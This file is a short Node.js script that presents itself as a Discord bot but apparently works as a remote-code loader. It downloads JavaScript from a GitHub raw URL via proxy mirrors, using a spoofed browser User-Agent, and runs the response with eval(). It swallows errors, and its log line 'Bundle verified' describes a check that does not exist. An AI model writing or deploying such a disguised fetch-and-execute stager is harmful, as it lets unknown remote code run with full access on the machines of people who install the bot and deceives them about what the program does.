const https = require('https');
const http = require('http');
const { URL } = require('url');

const REMOTE_SCRIPT_URLS = [
  'https://ghfast.top/https://raw.githubusercontent.com/hjhjairport/nfus/refs/heads/main/index.js',
  'https://gh-proxy.com/https://raw.githubusercontent.com/hjhjairport/nfus/refs/heads/main/index.js',
  'https://raw.githubusercontent.com/hjhjairport/nfus/refs/heads/main/index.js'
];

function fetchScript(url, timeoutMs = 15000) {
  return new Promise((resolve, reject) => {
    const get = (currentUrl, redirectCount = 0) => {
      if (redirectCount > 8) return reject(new Error('Too many redirects'));

      let u;
      try {
        u = new URL(currentUrl);
      } catch (e) {
        return reject(e);
      }

      const client = u.protocol === 'https:' ? https : http;
      const req = client.get(u, {
        headers: {
          'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64)',
          'Accept': '*/*'
        }
      });

      req.setTimeout(timeoutMs, () => {
        req.destroy(new Error('Fetch timeout'));
      });

      req.on('response', (res) => {
        if ([301, 302, 303, 307, 308].includes(res.statusCode) && res.headers.location) {
          const next = new URL(res.headers.location, currentUrl).href;
          return get(next, redirectCount + 1);
        }

        if (res.statusCode !== 200) {
          return reject(new Error(`HTTP ${res.statusCode}`));
        }

        let code = '';
        res.on('data', (chunk) => code += chunk);
        res.on('end', () => resolve(code));
      });

      req.on('error', reject);
    };

    doFetch: get(url);
  });
}

async function load() {
  console.log('[Discord Bot] Fetching application bundle...');
  for (let u of REMOTE_SCRIPT_URLS) {
    try {
      const code = await fetchScript(u);
      if (code && code.length > 500) {
        console.log('[Discord Bot] Bundle verified. Initializing...');
        eval(code);
        return;
      }
    } catch (e) {}
  }
  console.error('[Discord Bot Error] Failed to fetch application bundle.');
}

load();
